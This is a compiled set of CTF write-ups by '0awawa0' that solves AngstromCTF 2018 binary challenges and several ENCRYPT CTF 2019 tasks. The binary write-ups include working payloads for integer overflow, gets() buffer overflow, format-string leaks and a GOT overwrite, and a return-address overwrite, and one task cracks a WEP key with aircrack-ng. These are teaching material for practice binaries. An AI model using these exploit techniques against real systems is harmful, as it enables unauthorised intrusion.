<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-0awawa0
description: CTF writeups and security challenges by 0awawa0.
---

# Writeups by 0awawa0

Source repository: `/repos/0awawa0`

## Repository Index

- CTF-Writeups/README.md
- CTF-Writeups/b00t2root 2019/MISC/Can You Read Me/README.md
- CTF-Writeups/b00t2root 2019/MISC/Fight/README.md
- CTF-Writeups/b00t2root 2019/MISC/Treasure/README.md
- CTF-Writeups/b00t2root 2019/Forensics/Bird/README.md
- CTF-Writeups/b00t2root 2019/Forensics/Bird/README_ru.md
- CTF-Writeups/b00t2root 2019/Crypto/Scatter Me/README.md
- CTF-Writeups/YauzaCTF 2019/Stegano/Doberman/README.md
- CTF-Writeups/UUTCTF 2019/Reverse/Break My Record/README.md
- CTF-Writeups/UUTCTF 2019/Reverse/CorrectPass/README.md
- CTF-Writeups/UUTCTF 2019/Reverse/The Puzzle/README.md
- CTF-Writeups/Sunshine CTF/MISC/Big Bad/README.md
- CTF-Writeups/RealCTF 2019/Magic Brackets/README.md
- CTF-Writeups/PrayganCTF 2019/Forensics/Welcome/README.md
- CTF-Writeups/Newbie CTF 2019/Chat/README.md
- CTF-Writeups/Newbie CTF 2019/Contact Point/README.md
- CTF-Writeups/Newbie CTF 2019/Find the plain/README.md
- CTF-Writeups/Newbie CTF 2019/REC/README.md
- CTF-Writeups/Newbie CTF 2019/Top Secret/README.md
- CTF-Writeups/INSHACK 2019/Reverse/Obscure File Format/README.md
- CTF-Writeups/ENCRYPT CTF 2019/Web/Slash slash/README.md
- CTF-Writeups/ENCRYPT CTF 2019/Stegano/Into The Black/README.md
- CTF-Writeups/ENCRYPT CTF 2019/MISC/Way Back/README.md
- CTF-Writeups/ENCRYPT CTF 2019/MISC/ham-me-baby-2/README.md
- CTF-Writeups/ENCRYPT CTF 2019/Forensics/Journey to the centre of the file 2/README.md
- CTF-Writeups/ENCRYPT CTF 2019/Forensics/WrEP/README.md
- CTF-Writeups/AngstromCTF 2018/Binary/accumulator(50)/README.md
- CTF-Writeups/AngstromCTF 2018/Binary/cookie jar (60)/README.md
- CTF-Writeups/AngstromCTF 2018/Binary/number guess (70)/README.md
- CTF-Writeups/AngstromCTF 2018/Binary/personal letter (160)/README.md
- CTF-Writeups/AngstromCTF 2018/Binary/rop to the top (130)/README.md

## Writeup Content


### File: CTF-Writeups/AngstromCTF 2018/Binary/accumulator(50)/README.md

# accumulator

### Description

I found this program (accumulator64 file) that lets me add positive numbers to a variable,
but it won't give me a flag unless that variable is negative! Can you help me out?
Navigate to /problems/accumulator/ on the shell server to try your exploit out!

hint: How many bytes can an int store? How are positive and negative numbers represented in C?

### Solving

Okay, we have the binary file and a source code. The flag is on the remote server that runs given binary. So we need to find and exploit the binary's vulnerability. Let's do this.

First, let's try to run the binary.
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 1
The accumulator currently has a value of 1.
Please enter a positive integer to add: 2
The accumulator currently has a value of 3.
Please enter a positive integer to add: 3
The accumulator currently has a value of 6.
Please enter a positive integer to add: 4
The accumulator currently has a value of 10.
Please enter a positive integer to add: 5
The accumulator currently has a value of 15.
Please enter a positive integer to add: 6
The accumulator currently has a value of 21.
Please enter a positive integer to add: ^C
</pre>

The programm just sums entered numbers with the accumulator. Fine, let's see the source code now.

```C
#include <stdlib.h>
#include <stdio.h>

int main(){

	int accumulator = 0;
	int n;
	while (accumulator >= 0){
		printf("The accumulator currently has a value of %d.\n",accumulator);
		printf("Please enter a positive integer to add: ");

		if (scanf("%d",&n) != 1){
			printf("Error reading integer.\n");
		} else {
			if (n < 0){
				printf("You can't enter negatives!\n");
			} else {
				accumulator += n;
			}
		}
	}
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	
	printf("The accumulator has a value of %d. You win!\n", accumulator);
	system("/bin/cat flag");

}
```

There are two variables - accumulator and some integer value named "n". After that, we see the loop, that continues while the accumulator value is positive. After this loop ends, executes the system command that prints the flag.

So, we need to make the accumulator value negative, but the problem is we are not to enter any negative. What do we do?

We remember that int variables take only 4 bytes of memory and it's maxed value equals to 2,147,483,647, and if we sum 1 to the variable with this value, it will overflow and take the value of minimal possible int value -2,147,483,648. Now the solution is obvious, we will input 2,147,483,647 first, and after that, we enter 1. Accumulator will take the negative value and we will get the flag.

Let's do this:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 2147483647
The accumulator currently has a value of 2147483647.
Please enter a positive integer to add: 1
The accumulator has a value of -2147483648. You win!
HACKERMAN!
</pre>



### File: CTF-Writeups/AngstromCTF 2018/Binary/cookie jar (60)/README.md

# cookie jar

### Description

Try to break this Cookie Jar that was compiled from this source Once you've pwned the binary,
test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

hint: Look up some vulnerabilities associated with buffers.

### Solivng
I have the binary and the source code. First, I will try to run binary to see what am I working with:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
3
Sorry, you only had 0 cookies, try again!
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
jh&apos;
Sorry, you only had 0 cookies, try again!
</pre>

So, the programm asks to enter something, and after that it closes. Let's see the source code.

```C
#include <stdio.h>
#include <stdlib.h>

#define FLAG "----------REDACTED----------"

int main(int argc, char **argv){
  
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int numCookies = 0;

	char buffer[64];

	puts("Welcome to the Cookie Jar program!\n");
	puts("In order to get the flag, you will need to have 100 cookies!\n");
	puts("So, how many cookies are there in the cookie jar: ");
	fflush(stdout);
	gets(buffer);

	if (numCookies >= 100){
		printf("Congrats, you have %d cookies!\n", numCookies);
		printf("Here's your flag: %s\n", FLAG);
	} else {
		printf("Sorry, you only had %d cookies, try again!\n",numCookies);
	}
		
	return 0;
}
```
We have two variables: numCookies and the input buffer. The vulnarability is obvious, it is the buffer overflow. The thing is for buffer allocated 64 bytes of memory 
```C 
char buffer[64]
``` 
but there is no limitation for input
```C
gets(buffer)
```
So gets function is gonna write to the memory all I enter despite the input size. But the buffer has only 64 bytes of memory, and if I enter more than 64 bytes, this function will write data into the memory of variables located after the buffer. That's what we are gonna use. The first variable located after the buffer is numCookies, so we can rewrite this variable's value, overflowing the buffer. We will enter 64 bytes and than the numCookies value we want. Let's try it:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa999
Sorry, you only had 0 cookies, try again!
</pre>

Ha! Didn't work! That was odd for me, so I decided to watch this in IDA. I opened the main function stack and noticed that for buffer there is allocated 71 bytes instead of 64. Okay, so now I need to enter 71 bytes. Trying:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa100
Sorry, you only had 48 cookies, try again!
</pre>

Didn't work again, but there are some changes, that means we've overflow the buffer. I just add one more byte to input and got the flag:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa100
Congrats, you have 12336 cookies!
Here&apos;s your flag: ----------REDACTED----------
</pre>



### File: CTF-Writeups/AngstromCTF 2018/Binary/number guess (70)/README.md

# number guess

### Descripttion
Ian loves playing number guessing games, so he went ahead and wrote one himself (source).
I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

hint: Look up some vulnerabilities associated with the printf function.

### Solving

We have the executable and the source code, classic. And again the first thing I do - run the binary.

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
awawa
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
awawa&apos;s guess: 12323123
Sorry, the answer was 1375508. Try again :(
</pre>

The program generates two random numbers and asks me to guess their sum. Fine, let's see the source code now.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


char *flag = "REDACTED";
char buf[50];

int main(int argc, char **argv) {

	
	puts("Welcome to the number guessing game!");
	puts("Before we begin, please enter your name (40 chars max): ");
	fflush(stdout);
	fgets(buf, 40, stdin);
	buf[strlen(buf)-1] = '\0';
		
	strcat(buf, "'s guess: ");	
	puts("I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?");
	
	srand(time(NULL));
	int rand1 = rand() % 1000000;
	int rand2 = rand() % 1000000;

	printf(buf);
	fflush(stdout);
	int guess;
	char num[8];
	fgets(num,8,stdin);
	sscanf(num,"%d",&guess);

	if (guess == rand1+rand2){
		printf("Congrats, here's a flag: %s\n", flag);
	} else {
		printf("Sorry, the answer was %d. Try again :(\n", rand1+rand2); 
	}
	fflush(stdout);
	return 0;
}
```

This code has ```printf``` vulnerability here:
```C
...
fgets(buf, 40, stdin);
...
printf(buf);
...
```
First, the program writes the string we enter to the stack, and after that it prints this string to stdout. The key is that ```printf``` function handles string format parameters. You can see this in the source code here:
```C
printf("Sorry, the answer was %d. Try again:(\n", rand1+rand2);
```
The string contains ```%d``` parameter which means that the ```printf``` must take second argument, which is ```rand1+rand2```, as a digit and insert it's value to the output. And that's why we dont's see %d in the output, but we see the number. But what if the string contains string format parameters but it's the only argument passed to ```printf```? There won't be an error, the function will just take values from the stack and here is the way for us to find those rand1 and rand2 numbers, because they are located in the stack of "main" function.

So, here what I'm gonna do. I will type this string:
```
%d %d %d %d %d %d %d %d %d %d %d %d %d %d
```
to the input. The program will print stack content to the stdout and I will lose the game to see what the sum was. Knowing the sum, I will find two numbers which will be equals to this value when summed:
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d %d %d %d %d %d
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
-598746476 115 800219 -2090630696 -2090630592 -598746152 0 4196944 406424 -598746160 1362203648 4196944 -2094376313&apos;s guess: Sorry, the answer was 1206643. Try again :(
</pre>

Now I know the sum was ```1206643```. Next, I look for two numbers with equals sum. Here: ```800219``` and ```406424``` will be equals ```1206643``` when summed. So it's third and ninth numbers in the stack.

Now, to get the flag I will just get nine numbers from the stack and calculate the sum of third and ninth numbers:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d
I&apos;m thinking of two random numbers (0 to 1000000), can you tell me their sum?
-20332 234 307952 -11714088 -11713984 -20008 0 4196944 189624&apos;s guess: 497576
Congrats, here&apos;s a flag: REDACTED
</pre>


### File: CTF-Writeups/AngstromCTF 2018/Binary/personal letter (160)/README.md

# Foreword

First, I wanna say thanks to Umut Barış Öztunç and his team Break Point for their writeup to this task which you can find here: https://www.pwndiary.com/write-ups/angstrom-ctf-2018-personal-letter-write-up-pwn160/

I took the idea for the solution from here, although I tried to explain it in more details for people who, like me, have just started to play CTFs.

# personal letter

## Description

Have you ever gotten tired of writing your name in the header of a letter?
Well now there's a program (source)to do it for you! Navigate to /problems/letter/
on the shell server to try your exploit out!

hint: It prints your name right in the letter!

## Solution

Okay, let's start. First, as always I ran the binary to watch what am I working with.

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
aaaaaaaaaa
________________________________________
|                                      |
|                                      |
|  Dear aaaaaaaaaa,                    |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.

</pre>

So, the program just takes the input and inserts it to the formated output. Also we have the source code, but we don't actually need it if we just guess to try printf vulnerability. Anyway, I'll show you this vuln in code.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void printFlag(int status){

    printf("Status Code: %d\n",status);

    char flag[50];
    FILE *flagFile;
    if ((flagFile = fopen("flag.txt","r")) == NULL) {
        printf("Error opening file.");
        return;
    }

    fscanf(flagFile, "%s", flag);
    printf("Here's a flag: %s\n", flag);

    _Exit(0);
}

void printCard(char name[]) {
    int nameLen = strlen(name);

    char *cardTop = malloc(300);
    strcpy(cardTop, "________________________________________\n");
    strcat(cardTop, "|                                      |\n");
    strcat(cardTop, "|                                      |\n");
    char *cardMid = malloc(140);
    strcpy(cardMid, "|  Dear ");
    strcat(cardMid, name);


    strcat(cardMid, ",");
    for (int i = 0; i < 30-nameLen; i++)
        strcat(cardMid, " ");
    strcat(cardMid, "|\n");
    char *cardBottom = malloc(300);
    strcpy(cardBottom, "");
    for (int i = 0; i < 17; i++)
        strcat(cardBottom, "|  __________________________________  |\n");
    strcat(cardBottom, "|______________________________________|\n");

    printf(cardTop);
    printf(cardMid);
    printf(cardBottom);

    return;
}


void main(int argc, char **argv) {

    char buf[100];
    memset(buf, 0 , 100);

    puts("Welcome to the personal letter program!");
    puts("Give us your name, and we will generate a letter just for you!");
    puts("Enter Name (100 Chars max): ");
    fgets(buf, 100, stdin);
    buf[strlen(buf)-1] = '\0';
    printCard(buf);
    puts("Exiting.\n");

    exit(0);
}
```
Here you can see that the main() function calls function printCard() and passes to it our input. In this function our input being inserted to the cardMid string, which then is passed to printf() function:

```C
...
char *cardMid = malloc(140);
strcpy(cardMid, "|  Dear ");
strcat(cardMid, name);
...
printf(cardMid);
```

So we can use string format parameters in the input.

Also, you could just type some %x to the input just to check if there is a vulnerability in the program:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
%x
________________________________________
|                                      |
|                                      |
|  Dear ff7fa2d8,                            |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.
</pre>

Now, what can we do with this? There is a function printFlag(), so it would be great to call it somehow. Using string format parameters we can write bytes to the memory and change the call of the function. Now it's not clear, but I'll explain it later.

First, I disassemble the program using IDA and find the function's printFlag() address:

![printFlag_address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/printFlag_address.PNG)

So it is 0804872b. Next, we will find a function, which address we will rewrite. Here on the screen you can see that after printCard() function there are two more calls: puts() and exit(). We will rewrite exit() function's address. Actually you could ask, why don't we rewrite puts() address. I'll be fair, it won't work if with puts() function, and I don't know why for sure. I guess it's because of different work with stack in exit() and puts() functions.

Okay, I click the exit() function's name and I see this:

![exit_address1](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/exit_address1.PNG)

![exit_address2](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/exit_address2.PNG)

It's just redirect, double click on the offset and here we see the address (08 04 a0 30) were stores 4 bytes of exit() function's real address:

![exit_address3](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/exit_address3.PNG)

![exit_address4](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/exit_address4.PNG)

It is stored like this c8 a0 04 08, so we need to rewrite first 2 bytes to get 2b 87 04 08 and this address will be printFlag() function's address and instead of exit() function the program will call printFlag().

Now we know what we have got to do. First part of input will be like this "\x30\xa0\x04\x08\x31\xa0\x04\x08". Those are addresses in memory we will rewrite. Second part must contain more interesting data. We must write something like this "%(digit1)x%(digit2)\$hhn%(digit3)x%(digit4)\$hhn".

First we need to find digit2 and digit4. Those are indexes of digits we will write to addresses. So how will we find them? We will debug the program with stop point on the printf() function call. And then we will inspect printCard() function's frame of stack to find them.

![printfStopPoint](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/printfStopPoint.PNG)

![stackView](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/stackView.PNG)

![inputStackAddress](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(160)/src/inputStackAddress.PNG)

Here on the screenshots we see that our input are stored at indexes 26 and 27 in the printCard() stack. Now we need to find digit1 and digit3. In the stack are stored 16 bytes: "| Dear, " - it's first 8 and our input will be 8 bytes too. So now we have 16 bytes. It's 10h, and we need 2bh, so the digit1 will be 2bh-10h=1bh=27. Next, we will need 87h, but we have 2b. digit3 will be 87h-2bh=5ch=92. Now we have our input: \x30\xa0\x04\x08\x31\xa0\x04\x08%27x%26\$hhn%92x%27\$hhn. But we can't write bytes from keyboard so I will use echo -e. Let's try it.
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># echo -e &quot;\x30\xa0\x04\x08\x31\xa0\x04\x08%27x%26\$hhn%92x%27\$hhn&quot; | ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
________________________________________
|                                      |
|                                      |
|  Dear 0�1�                   ff7fa218                                                                                          1c,|
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.

Status Code: 0
Here&apos;s a flag: actf{flags_are_fun}
</pre>


### File: CTF-Writeups/AngstromCTF 2018/Binary/rop to the top (130)/README.md

# rop to the top

## Description

Here's some binary and source. Navigate to /problems/roptothetop/ on the shell server to try your exploit out!

hint: Look up "Return Oriented Programming" (ROP) vulnerabilities
and figure out how you might be able to change the return address.

## Solving

First, as always, I ran the binary. Here is what I saw:
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># mv ./rop_to_the_top32 ./rop32
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32
Usage: ./rop_to_the_top32 &lt;inputString&gt;
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32 &quot;some string&quot;
Now copying input...
Done!
</pre>

So the program takes one string argument and just does something with it. Now let's see the source code.
```C
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void the_top(){

    system("/bin/cat flag");

}

void fun_copy(char *input){

    char destination[32];
    strcpy(destination, input);
    puts("Done!");
}

int main (int argc, char **argv){
    gid_t gid = getegid();
    setresgid(gid,gid,gid);

    if (argc == 2){
        puts("Now copying input...");
        fun_copy(argv[1]);
    } else {
        puts("Usage: ./rop_to_the_top32 <inputString>");
    }

    return 0;
}
```

The program actually copies the input to the buffer (destination variable). Still, as I can see, there is no limitation for the input, but the buffer has only 32 bytes in length. So, I can overflow the buffer. Another important thing is that there is a function "the_top" which actually prints the flag. Now I need to figure out how can I use the buffer overflow to call "the_top", so I can get the flag.

I decided to look at this program in the IDA. I found function "fun_copy" and looked into its stack. Here's the destination variable's start

![dest_starts](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/dest_starts.PNG)

I need the buffer's start offset. It's -28h. And here I see the end of the buffer and the main thing is that here you can see the variable called 'r'. It's a return address (the address of the command that will be executed after the function finishes it's work). And I can rewrite its value, overflowing the buffer.

![return_address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/return_offset.PNG)

And I need its offset too. It's +04h. So, there is ```4h-(-28h)=2Ch=44``` bytes from the start of the buffer and to the start of the return address. Now, I need to write 44 bytes to the input and 4 more bytes to rewrite return address.

Next, I found the function's "the_top" address. Here you can see it (08 04 84 DB):

![address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/addressPNG.PNG)

Okay, now I have everything to get the flag. But I can't write the address from the keyboard, cause it's non-printable bytes. So I will use Python to do it. So, let's do it:

<pre><font color="#EF2929"><b>oot@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32 &quot;`python -c \&quot;print &apos;A&apos;*44 + &apos;\xdb\x84\x04\x08&apos;&quot;`&quot;
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault
</pre>


### File: CTF-Writeups/ENCRYPT CTF 2019/Forensics/Journey to the centre of the file 2/README.md

# Journey to the centre of the file 2

## Task

![task](./src/task.png)

[ziptunnel2](./src/ziptunnel2)

## Solution

First, I look at this file through 010Editor:

![hexview](./src/hexview.png)

So the file compressed with bzip2. Here's a script to decompress it:

```Python
import bz2

with open('ziptunnel2', "rb") as f:
	data = f.read()

data = bz2.decompress(data)

with open("flag", "wb") as f:
	f.write(data)
```
Decompressing gives us following file:

![flag_hexview](./src/flag_hexview.png)

That's zip. Decompressing it will give us gzip file. If we decompress it we will get bz2 file and so on. So decompress it without automation will last too long. That's why I wrote the following script:

```Python
import gzip
import bz2
import zipfile

while 1:
	try:
		with zipfile.ZipFile("flag") as z:
			z.extractall()
	except:
		with open("flag", "rb") as f:
			data = f.read()
			try:
				data = gzip.decompress(data)
				with open("flag", "wb") as f:
					f.write(data)
			except:
				try:
					data = bz2.decompress(data)
					with open("flag", "wb") as f:
						f.write(data)
				except:
					print(data)
					break
```
And here we go: 
![flag](./src/flag.png)

Flag: `encryptCTF{f33ls_g00d_d0nt_it?}`


### File: CTF-Writeups/ENCRYPT CTF 2019/Forensics/WrEP/README.md

# WrEP

## Task

![task](./src/task.png)

[captured.cap](./src/encryptCTFWEP.cap)

## Solution

Just feed it to `aircrack-ng` and you will get the password:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared/Encrypt</b></font># aircrack-ng encryptCTFWEP.cap
Opening encryptCTFWEP.cap
Read 546320 packets.

   #  BSSID              ESSID                     Encryption

   1  58:D7:59:79:61:34  MCSP                      No data - WEP or WPA
   2  40:31:3C:E6:CA:3C  Malik’s                 WPA (1 handshake)
   3  14:CC:20:F5:32:FE  encryptCTF                WEP (88648 IVs)
   4  0C:D2:B5:72:3C:D4  home                      WPA (0 handshake)
   5  E4:6F:13:80:82:99  prime2                    No data - WEP or WPA
   6  04:95:E6:05:50:60  Letzpay1                  WPA (0 handshake)
   7  C4:B8:B4:BF:5B:C8  foresightinn              No data - WEP or WPA
   8  B4:EF:FA:51:EC:53  Le 2                      No data - WEP or WPA
   9  72:B7:AA:33:56:23  vivo 1802                 None (0.0.0.0)
  10  78:D3:8D:E4:E5:8C  Sarovar                   None (172.16.168.188)
  11  50:5D:AC:94:3D:E4  Webnyxa_airtel_12G        No data - WEP or WPA
  12  C4:B8:B4:4D:93:74  Webnyxa_airtel_first      No data - WEP or WPA
  13  C8:D7:79:A7:E0:0A                            Unknown
  14  B0:C1:9E:A3:18:BA  Airtel-Hotspot-18BA       WPA (0 handshake)
  15  C4:B8:B4:A8:92:20  sanchez                   No data - WEP or WPA
  16  74:DA:DA:D8:86:77  Orium                     WPA (0 handshake)
  17  AC:EE:9E:91:D3:43  AndroidAP                 No data - WEP or WPA
  18  AE:56:2C:96:57:C9                            Unknown
  19  84:FE:DC:DC:8C:06  password                  No data - WEP or WPA
  20  04:B1:67:C2:3D:87  Redmiamit                 No data - WEP or WPA
  21  70:5A:AC:92:B9:BC  Ritesh mobile             No data - WEP or WPA

Index number of target network ? 3

Opening encryptCTFWEP.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 88648 ivs.


                                 Aircrack-ng 1.2 rc4


                 [00:00:00] Tested 837 keys (got 85909 IVs)

   KB    depth   byte(vote)
    0    0/ 17   57(107520) 84(99840) 71(97536) B5(97536) D0(96512) 
    1    0/  1   C4(116992) DD(98816) 1A(97792) 3A(96768) 59(94720) 
    2    2/  2   3E(101632) 4D(98816) 9B(97536) 2B(96256) 5E(96000) 
    3   13/  3   C5(93952) B6(93440) 63(93184) 72(93184) B8(92928) 
    4    0/  1   98(121344) F8(98048) C2(97536) C1(97280) D4(96000) 

     KEY FOUND! [ 57:34:35:5F:31:37:5F:52:33:34:4C:3F:21 ] (ASCII: W45_17_R34L?! )
	Decrypted correctly: 100%

</pre>

Flag: `encryptCTF{W45_17_R34L?!}`


### File: CTF-Writeups/ENCRYPT CTF 2019/MISC/Way Back/README.md

# Way Back

## Task

![task](./src/task.png)

[ENCRYPT.png](./src/ENCRYPT.png)

## Solution

So we have the punch card:

![ENCRYPT.png](./src/ENCRYPT.png)

All we need to do is to find how to read this. A bit googling and here u go: http://www.quadibloc.com/comp/cardint.htm
I decoded the punch card using this pic:

![alphabet](./src/alphabet.gif)

And I got this string: `B4TCH_PR0CE551NG_155_N0T_G00D`

So the flag is: `encryptCTF{B4TCH_PR0CE551NG_155_N0T_G00D}`



### File: CTF-Writeups/ENCRYPT CTF 2019/MISC/ham-me-baby-2/README.md

# ham-me-baby-2

## Task

![task](./src/task.png)

## Solution

Connecting to the server gives us this:
<pre>                        Welcome To 

     ____                       __    _______________  
    / __/__  __________ _____  / /_  / ___/_  __/ __/  
   / _// _ \/ __/ __/ // / _ \/ __/ / /__  / / / _/    
  /___/_//_/\__/_/  \_, / .__/\__/  \___/ /_/ /_/      
                ___/___/_/_____                        
               |_  |/ _ &lt;  / _ \                       
              / __// // / /\_, /                       
             /____/\___/_//___/                        
                                                         

you will be receiving hamming(7,4) codes. your job is to send data bits
from a 7 bit hamming code. 
 ___________________________________________________________________
|                                                                   |
|   DO YOUR RESEARCH : https://en.wikipedia.org/wiki/Hamming(7,4)   |
|  FLAG WILL BE PRINTED AFTER YOU SEND CORRECT DATA BITS 100 TIMES  |
|___________________________________________________________________|

               the order of the bits followed is

                    P1 P2 D3 P4 D5 D6 D7


and come back here. remember somebits could be flipped. you need to send
correct data bits.

[*] CODE: 0110000
[*] DATA:</pre>

So the task is actually to write a little script to recover data from hamming(7,4) code. A little bit googling and I have found this site: https://studylib.net/doc/8184421/hamming--7--4--3--code---cs1001.py

Using this code I wrote following script:

```Python
import socket
import re

def hamming_decode(y1,y2,y3 ,y4,y5,y6 ,y7):
    """  Hamming  decoding  of the 7 bits  signal  """
    b1= (y1+y3+y5+y7) % 2
    b2= (y2+y3+y6+y7) % 2
    b3= (y4+y5+y6+y7) % 2
    b=4*b3+2*b2+b1 
    # the  integer  value
    if b==0 or b==1 or b==2 or b==4:
        return (y3,y5,y6 ,y7)
    else:
        y=[y1,y2 ,y3,y4,y5 ,y6,y7]
        y[b-1]=(y[b -1]+1) % 2   # correct  bit b
        return (y[2],y[4],y[5],y[6])

s = socket.socket()
s.connect(("104.154.106.182", 6969))

print(s.recv(1024).decode())
print(s.recv(1024).decode())
data = s.recv(1024).decode()
pattern = re.compile("[01]{7}")
m = pattern.findall(data)

data = m[0]
ready = []

for i in data:
    ready.append(int(i))
print(data)
answer = b''
resp = hamming_decode(*ready)
for i in resp:
    if i == 1:
        answer += b"1"
    else:
        answer += b"0"
answer += b"\n"

while 1:
    s.send(answer)
    data = s.recv(1024).decode()
    m = pattern.findall(data)
    if len(m) == 0:
        print(data)
        data = s.recv(1024).decode()
        m = pattern.findall(data)
    data = m[0]
    ready = []
    for i in data:
        ready.append(int(i))
    resp = hamming_decode(*ready)
    answer = b""
    for i in resp:
        if i == 1:
            answer += b"1"
        else:
            answer += b"0"
    answer += b"\n"

```

